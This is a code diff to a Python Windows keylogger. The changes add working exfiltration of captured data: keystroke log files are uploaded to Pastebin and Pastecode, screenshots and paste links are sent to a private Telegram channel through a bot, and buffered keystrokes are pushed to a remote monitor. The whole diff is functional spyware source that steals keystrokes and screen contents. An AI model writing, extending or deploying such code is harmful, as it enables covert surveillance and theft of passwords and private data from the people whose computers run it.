@@ -23,10 +23,12 @@
 #
 # Features:         * Record keystrokes
 #                   * Periodic screen capture
-#                   * Send data to a remote computer with Monitor App (to do)
-#                   * Send data to an email account (to do)
+#                   * Send data to a remote computer with Monitor App
+#                   * Send data to an email account
+#                   * Paste data to a Paste service
+#                   * Send images and paste urls to a Telegram private Channel with a Telegram Bot
 #                   * Send data to a Twitter account (to do)
-#                   * Paste data to a Paste service/site (to do)
+#
 #
 # Required:         Install with "pip install module-name-required"
 #                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2, python-telegram-bot
@@ -63,15 +65,19 @@ import base64
 import datetime
 import getpass
 import glob
+import json
 import logging
 import os
 import platform
 from smtplib import SMTP
 import pythoncom
 import pyWinhook as pyHook
+import re
+import requests
 import smtplib
 import socket
 import sys
+from telegram.ext import Updater, CommandHandler
 import tempfile
 import threading
 import time
@@ -95,7 +101,7 @@ KLGEXT = '.dek'                         # Keylogger file extension
 SCRPRE = 'scr_'                         # Screenshot file name prefix
 SCREXT = '.png'                         # Screenshot file extension
 KEYCODE_EXIT = 7                        # CTRL + G : special combination to close / deactivate keylogger
-KEYSTOSCREENSHOT = 50                   # Screenshots every x Keystrokes
+KEYSTOSCREENSHOT = 75                   # Screenshots every x Keystrokes
 
 # Server constants
 SERVER_IP = ''
@@ -166,18 +172,18 @@ class ScreenShootThread(threading.Thread):
 
     def run(self):
         logging.debug('Guardado captura {}'.format(self.screen_file))
-        app = wx.App()  # Need to create an App instance before doing anything
+        app = wx.App()                  # Need to create an App instance before doing anything
         screen = wx.ScreenDC()
         size_x, size_y = screen.GetSize()
         bmp = wx.EmptyBitmap(size_x, size_y, -1)
         mem = wx.MemoryDC(bmp)
         mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
-        del mem  # libera memoria que contiene captura de imagen
-        del app  # libera objeto de instancia de la aplicación
+        del mem                         # free memory containing image capture
+        del app                         # free application instance object
         bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
         logging.debug('Fin captura {}'.format(self.screen_file))
-        # Send screenshot to remote servers
-        # ... pending ...
+        # Send screenshot to Telegram bot
+        telegram_bot_image(self.screen_file)
 
 
 # Threading class to listen Monitor petitions and create client parameters for response and send data to monitor.
@@ -270,7 +276,7 @@ class ServerListenerThread(threading.Thread):
 def monitor_data_send(data_to_send):
     global monitor_soc, monitor_ip, monitor_port, monitor_enable_send, keylog_name
     # Can send?
-    if monitor_enable_send and monitor_ip is not None and monitor_port is not None and os.path.getsize(keylog_name) >= file_size_trigger:
+    if monitor_enable_send and monitor_ip is not None and monitor_port is not None:
         try:
             # Open connection to monitor if not connection exists
             if not monitor_soc:
@@ -343,11 +349,52 @@ def load_file(file_name):
     return data
 
 
+# Telegram Bot. Get text and chat_id
+def telegram_bot_get_chatid():
+    response = requests.get(config.TELEGRAM_BOT_URL + config.TELEGRAM_BOT_GETME)
+    getme = json.loads(response.content.decode(ENCODING))
+    logging.debug('Telegram GetMe: {}'.format(getme))
+    username = getme["result"]["username"]
+    chat_id = getme["result"]["id"]
+    return (chat_id, username)
+
+
+# Sends a message to a Telegram Bot
+def telegram_bot_message(message):
+    if config.TELEGRAM_BOT_ENABLED:
+        (chat_id, username) = telegram_bot_get_chatid()
+        logging.debug('Telegram Bot id: {} Username: {}'.format(chat_id, username))
+        message = urllib.parse.quote_plus(message)
+        #params = '?text="{}"&chat_id={}'.format(message, chat_id)
+        params = '?text="{}"&chat_id={}'.format(message, config.TELEGRAM_BOT_CHANNELID)
+        url = config.TELEGRAM_BOT_URL + config.TELEGRAM_BOT_SEND + params
+        logging.debug('Telegram Bot sending: {}'.format(url))
+        response = requests.get(url)
+        content = response.content.decode(ENCODING)
+        logging.debug('Telegram Bot response: {}'.format(content))
+        return content
+    else:
+        logging.debug('Telegram Bot Disabled')
+        return None
+
+
+# Sends local file image to a Telegram Bot
+def telegram_bot_image(image_file):
+    if config.TELEGRAM_BOT_ENABLED:
+        logging.debug('Telegram Bot sending image: {}'.format(image_file))
+        file = {'photo': open(image_file, "rb")}
+        data_chat = {'chat_id': config.TELEGRAM_BOT_CHANNELID}
+        url = config.TELEGRAM_BOT_URL + config.TELEGRAM_BOT_SENDPHOTO
+        resp = requests.post(url, files=file, data=data_chat)
+        logging.debug('Telegram Bot response: {} {} {}'.format(resp.status_code, resp.reason, resp.content))
+    else:
+        logging.debug('Telegram Bot Disabled')
+
+
 # Sends keylogger file to a paste service
 # : file_name = full path of file to send
 # : service = 1 => Pastebin      https://pastebin.com/api        example: https://pastebin.com/tW4Z2KXG
 # : service = 2 => Pastecode     https://pastecode.xyz/api       example: https://pastecode.xyz/view/722cfc48
-# : service = 3 => Telegram Bot  https://core.telegram.org/bots/api
 def paste_file(file_name, service):
     paste_service_url = ""
     paste_params = {}
@@ -380,10 +427,6 @@ def paste_file(file_name, service):
                         'expire': config.PASTECODE_POST_EXPIRE
                         }
         logging.info('Pastecode envia: {}'.format(paste_params))
-    elif service == config.PASTE_TELEGRAM and config.TELEGRAM_BOT_ENABLED:  # Telegram Bot
-        paste_params = {}
-        paste_service_url = config.TELEGRAM_BOT_POST_URL + '&text=str(load_file(file_name)'
-        logging.info('Telegram Bot envia: {}'.format(paste_service_url))
     else:
         logging.debug('No esta activado ningun servicio de Paste')
 
@@ -391,9 +434,10 @@ def paste_file(file_name, service):
         # Encode data
         data_encoded = urllib.parse.urlencode(paste_params)
         data_encoded = data_encoded.encode(ENCODING)
-        logging.debug('Parametros codificados {}'.format(data_encoded))
+        logging.debug('Parametros codificados: {}'.format(data_encoded))
 
         # HTTP post request
+        logging.debug('URL a llamar: {}'.format(paste_service_url))
         req = urllib.request.urlopen(paste_service_url, data_encoded)
 
         # Get url of file pasted from API response
@@ -514,9 +558,14 @@ def send_keylog_file(keylog_name):
     url_paste = paste_file(keylog_name, config.PASTE_PASTECODE)
     logging.info('Pastecode url : {}'.format(url_paste))
 
+    # Sends to Telegram Channel the url of paste
+    telegram_bot_message('New keylogger paste: {}'.format(url_paste))
+
+    '''
     logging.debug('Sending to Telegram...')
     url_paste = paste_file(keylog_name, config.PASTE_TELEGRAM)
     logging.info('Pastecode url : {}'.format(url_paste))
+    '''
 
     # Envia a Monitor
     # monitor_data_send()
@@ -609,6 +658,7 @@ def add_key_to_buffer(event):
 
     # inc key counter.
     if len(ckey) > 0:
+        # monitor_data_send(ckey)             # Sends data to monitor
         key_counter += 1
         # If the counter is a multiple of args.keystoscreenshot, do a screenshot.
         if key_counter % args.keystoscreenshot == 0:
@@ -616,11 +666,13 @@ def add_key_to_buffer(event):
 
     # si buffer esta lleno lo vacia y envia el fichero en caso de ser necesario
     if len(key_buffer) > key_max_chars:
-        monitor_data_send(key_buffer)           # Sends data to monitor
+        monitor_data_send(key_buffer)         # Sends buffer data to monitor
         flush_key_buffer_to_disk()
         # if the file size has exceeded the limit
         if os.path.getsize(keylog_name) >= file_size_trigger:
-            send_keylog_file(keylog_name)
+            keylog_send = keylog_name
+            create_keylog_file()                # creates new keylog file
+            send_keylog_file(keylog_send)
 
     return True
 
@@ -695,7 +747,7 @@ def on_keyboard_event(event):
 
 # Actions to do before Exit program
 def exit_program():
-    global key_buffer, threadList, server, hm
+    global key_buffer, threadList, server, hm, keylog_name
     logging.debug('Entering exit_program')
 
     # do a last screenshot
@@ -710,7 +762,7 @@ def exit_program():
     flush_key_buffer_to_disk()
 
     # send de last keylog capture file
-    send_keylog_file()
+    send_keylog_file(keylog_name)
 
     # wait to all threads are finished
     for thr in threadList:
@@ -728,7 +780,7 @@ def exit_program():
 
 # When program is closed
 def on_close_program():
-    global key_buffer, threadList, server, hm
+    global key_buffer, threadList, server, hm, keylog_name
     logging.debug('Entering on_close_program')
 
     # ejecuta ultima captura de pantalla antes de cerrar - do a last screenshot
@@ -744,7 +796,7 @@ def on_close_program():
     flush_key_buffer_to_disk()
 
     # envia ultimo fichero de log de teclas - send de last keylog capture file
-    send_keylog_file()
+    send_keylog_file(keylog_name)
 
     # espera que finalicen todos los threads que pueda haber activos
     # wait to all threads are finished
@@ -859,6 +911,9 @@ hm.HookKeyboard()
 server = ServerListenerThread(SERVER_IP, SERVER_PORT, SERVER_BUFFER_SIZE)
 server.start()
 # threadList.append(server)
+
+# Telegram Bot start message - Simply as a testimonial notification
+telegram_bot_message('Starting ' + APPNAME + ' v' + VERSION)
 
 # Handler to do actions when application is closed
 # atexit.register(on_close_program)
